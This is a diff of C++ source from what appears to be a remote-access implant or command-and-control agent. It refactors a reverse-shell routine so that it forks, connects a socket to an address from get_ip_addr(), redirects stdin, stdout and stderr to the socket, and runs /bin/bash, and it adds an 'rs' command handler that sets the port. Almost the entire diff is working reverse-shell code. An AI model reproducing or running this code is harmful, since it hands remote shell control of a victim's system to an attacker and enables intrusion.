@@ -20,32 +20,46 @@ std::string exec(const char* cmd){
     return result;
 }
 
-int revshell(ARGS args){
+
+int revshell(int port){
+    if (fork() == 0){
+        struct sockaddr_in sa;
+        sa.sin_family = AF_INET;
+        sa.sin_port = htons(port);
+        sa.sin_addr.s_addr = inet_addr(get_ip_addr());
+        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        sleep(1);
+        if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0){
+            return 101;
+        }
+        
+        dup2(sockfd, 0); //bind stdin to sock
+        dup2(sockfd, 1); //bind stdout to sock
+        dup2(sockfd, 2); //bind stderr to sock
+
+        char *const argv[] = {"/bin/bash", NULL};
+        execve("/bin/bash", argv, NULL);
+        exit(0);
+    }
+    return 0;
+}
+
+int port;
+int get_port(){
+    return port;
+}
+
+int rs(ARGS args){
     if (args.size() != 1){
         return 1;
     }
-    int port;
+    int p;
     try {
-        port = std::stoi(args[0]);
+        p = std::stoi(args[0]);
     }
     catch (...){
         return 1;
     }
-    struct sockaddr_in sa;
-    sa.sin_family = AF_INET;
-    sa.sin_port = htons(port);
-    sa.sin_addr.s_addr = inet_addr(get_ip_addr());
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    sleep(1);
-    if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0){
-        return 101;
-    }
-    
-    dup2(sockfd, 0); //bind stdin to sock
-    dup2(sockfd, 1); //bind stdout to sock
-    dup2(sockfd, 2); //bind stderr to sock
-
-    char *const argv[] = {"/bin/bash", NULL};
-    execve("/bin/bash", argv, NULL);
-    return 0;
+    port = p;
+    return 99; //stop accept signal
 }
